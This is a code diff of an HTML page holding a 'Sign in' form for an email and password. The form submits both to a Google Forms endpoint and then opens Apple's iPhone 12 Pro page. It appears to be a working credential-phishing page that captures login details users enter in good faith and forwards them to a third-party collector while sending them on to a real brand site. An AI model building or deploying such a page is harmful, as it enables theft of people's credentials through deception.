@@ -19,59 +19,43 @@
 </style>
 <script>
     function openWin() {
+       /* window.open("https://www.apple.com/in/iphone-12-pro/");*/
+       var v= document.form.name.value;
+       var p=document.form.password.value;
+       if(v == "" || p==""){
+           alert("please enter value")
+       }else{
         window.open("https://www.apple.com/in/iphone-12-pro/");
-      }
+       }
 
-      function ValidateEmail(inputText)
-        {
-        var mailformat = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
-        if(inputText.value.match(mailformat))
-        {
-       
-        document.form1.text1.focus();
-        return true;
-        }
-        else
-        {
-        alert("You have entered an invalid email address!");
-        document.form1.text1.focus();
-        return false;
-        }
-        }
+      }
+      
+
+
     
 </script>
 </head>
-<body onload='document.form1.text1.focus()' >
-    <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfxFiEBM2PpqUiFK52oC0GRVbaz9-2pDlG_8B2jIm33qw-q9w/formResponse" target="_self" method="POST" id="mG61Hd" jsmodel="TOfxwf Q91hve" data-response="%.@.[]]" data-first-entry="0" data-last-entry="2" data-is-first-page="true">
+<body>
+    <div id="error"></div>
+    <form name="form"action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfxFiEBM2PpqUiFK52oC0GRVbaz9-2pDlG_8B2jIm33qw-q9w/formResponse" target="_self" method="POST" id="mG61Hd" jsmodel="TOfxwf Q91hve" data-response="%.@.[]]" data-first-entry="0" data-last-entry="2" data-is-first-page="true">
         
         <div class="form-group">
             <label for="inputEmail">Email</label>
-            <input type="email" class="form-control" name="entry.1232965585" id="inputEmail" placeholder="Email">
+            <input id="name" type="email" required class="form-control" name="entry.1232965585" id="inputEmail" placeholder="Email">
         </div>
         <div class="form-group">
             <label for="inputPassword">Password</label>
-            <input type="text" name="entry.1644088402" class="form-control" id="inputPassword" placeholder="Password">
+            <input type="text" id="password" required name="entry.1644088402" class="form-control" id="inputPassword" placeholder="Password">
         </div>
         <div class="form-group">
             <label class="form-check-label"><input type="checkbox"> Remember me</label>
         </div>
-        <button type="submit" class="btn btn-primary" onclick="openWin() " >Sign in</button>
+        <button type="submit" class="btn btn-primary" onclick="openWin()">Sign in</button>
     </form>
 
 
 
-  <!--  <div class="form-group">
-        <label for="inputEmail">Email</label>
-        <input type="email" class="form-control" name="entry.1232965585" id="inputEmail" placeholder="Email">
-    </div>
-    <div class="form-group">
-        <label for="inputPassword">Password</label>
-        <input type="text" name="entry.1644088402" class="form-control" id="inputPassword" placeholder="Password">
-    </div>
-    <div class="form-group">
-        <label class="form-check-label"><input type="checkbox"> Remember me</label>
-    </div>
-    <button type="submit" class="btn btn-primary" onclick="openWin()">Sign in</button> -->
+
 
 
 
@@ -82,14 +66,9 @@
 
    <!-- <h1>Form</h1>
 <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfxFiEBM2PpqUiFK52oC0GRVbaz9-2pDlG_8B2jIm33qw-q9w/formResponse" target="_self" method="POST" id="mG61Hd" jsmodel="TOfxwf Q91hve" data-response="%.@.[]]" data-first-entry="0" data-last-entry="2" data-is-first-page="true">
-
-
 <input  class="name" type="text" name="entry.1644088402" value="">
 <label class="namel" for="">Name</label> <br>
 <label class="emaill" for="">Email</label>
 <input  class="email"type="email" name="entry.1232965585" value=""> <br>
-
 <input  class="submit"type="submit" name="" >
 </form> -->
-</body>
-</html>
